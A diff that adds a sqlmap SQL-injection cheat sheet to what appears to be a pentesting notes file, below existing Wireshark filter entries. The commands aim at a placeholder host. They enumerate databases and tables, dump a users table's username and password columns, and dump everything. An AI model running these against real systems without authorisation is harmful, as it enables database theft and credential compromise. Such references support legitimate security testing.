@@ -402,4 +402,26 @@ dns.resp.addr == x.x.x.x: Filters DNS responses with a specific IP address.
 ssl.handshake: Filters SSL handshake packets.
 ssl.record.content_type == 23: Filters SSL application data packets.
 ```
-
+SQLMAP for SQL injection:
+--------------------------------------------
+```
+sqlmap -u "http://target.com/page.php?id=1"
+sqlmap -u "http://target.com/login.php" --data="username=admin&password=pass"
+sqlmap -r request.txt
+sqlmap -u "http://target.com/page.php?id=1" -p id
+sqlmap -u "https://target.com/page.php?id=1" --level=5 --risk=3
+sqlmap -r request.txt --technique=T
+sqlmap -r request.txt --technique=T --time-sec=10
+sqlmap -r request.txt --technique=T --threads=10
+sqlmap -r request.txt --technique=T --batch
+sqlmap -r request.txt --technique=T --keep-alive
+sqlmap -r request.txt --technique=T --predict-output
+sqlmap -r request.txt --technique=T --batch --current-db
+sqlmap -r request.txt --technique=T --batch --dbs
+sqlmap -r request.txt --technique=T --batch -D dbname --tables
+sqlmap -r request.txt --technique=T --batch -D dbname -T users --columns
+sqlmap -r request.txt -D dbname -T users --dump
+sqlmap -r request.txt -D dbname -T users -C username,password --dump
+sqlmap -r request.txt --technique=T --dump-all
+sqlmap -r request.txt --technique=T --dump-all --resume
+```
